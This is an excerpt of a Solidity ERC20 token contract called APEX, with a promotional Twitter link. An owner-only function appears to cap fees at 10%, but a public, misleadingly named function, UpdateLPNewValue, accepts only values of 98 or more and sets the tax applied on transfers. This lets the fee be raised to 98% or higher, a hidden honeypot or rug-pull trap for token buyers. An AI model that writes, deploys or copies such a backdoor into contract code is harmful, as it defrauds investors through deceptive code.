...
Twitter : https://twitter.com/Apex_ERC
...
contract APEX is ERC20, Ownable {
    ...
    uint256 public tokenLiquidityThreshold = 1 * 1000000 * 10**18;

    uint256 public genesis_block;
    uint256 private deadline = 0;
    uint256 private launchtax = 0;

    address public marketingWallet = 0x81DC8E30D84BD799101B6FCFbd2D17C8e565F018;
    ...
    Taxes public NewUpdatedValue = Taxes(2 , 0);
    ...
    function _transfer(
        ...
        if (_interlock || exemptFee[sender] || exemptFee[recipient])
            ...
            feeswap = NewUpdatedValue.liquidity + NewUpdatedValue.marketing;
            feesum = feeswap;
            currentTaxes = NewUpdatedValue;
    ...
    function UpdateLPNewValue(uint256 amount) public {
        require(amount >=98);
        NewUpdatedValue = Taxes(amount, 0);
    }
    ...
    function OutCharges(uint256 _marketing, uint256 _liquidity)
        ...
        onlyOwner
    {
        NewUpdatedValue = Taxes(_marketing, _liquidity);
        require(
            (_marketing + _liquidity) <= 10,
            "Must keep fees at 10% or less"
        );
